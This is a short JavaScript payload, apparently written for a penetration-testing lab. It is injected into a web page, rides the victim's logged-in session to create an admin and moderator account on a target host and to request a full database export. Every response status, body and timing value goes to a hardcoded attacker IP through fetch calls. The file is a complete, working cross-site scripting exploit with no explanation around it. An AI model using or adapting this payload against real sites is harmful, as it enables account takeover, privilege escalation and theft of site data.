const attacker_ip = '192.168.119.143';
var h1s = document.getElementsByTagName("h1");
fetch('http://192.168.119.143/'+h1s[1].textContent, {});

const host = 'answers'
const host_ip = '192.168.143.251'

username = "wiggles1234"
email = "wiggles1234@email.com"
isAdmin = "true"
isMod = "true"
let config = {
      "method":"POST",
      "credentials":"include",
      mode: "cors",
      headers: {
            "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "name=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&isAdmin=" + encodeURIComponent(isAdmin) + "&isMod=" + encodeURIComponent(isMod)
  };
/// Create an Admin user and seed values to crack the users password
let start = Date.now()
doRequest(`http://${host_ip}/admin/users/create`, config);
let end = Date.now()

fetch(`http://${attacker_ip}/?start_time=` + start, {
  mode: "cors",
});

fetch(`http://${attacker_ip}/?end_time=` + end, {
  mode: "cors",
});



// Export the Data Base
config = {
  "method":"GET",
  "credentials":"include",
  mode: "cors",
  headers: {
        "Content-Type": "application/xml"
  },
};
doRequest(`http://${host_ip}/admin/export`, config);



// Helper Functions
function doRequest(endpoint, cfg) {

  fetch(endpoint, cfg).then(async (response) => {
      fetch(`http://${attacker_ip}/?endpoint=` + endpoint, {
        mode: "cors",
      });   
      fetch(`http://${attacker_ip}/?status_code=` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      fetch(`http://${attacker_ip}/?body=` + data, {
        mode: "cors",
      });
    }
  });
}


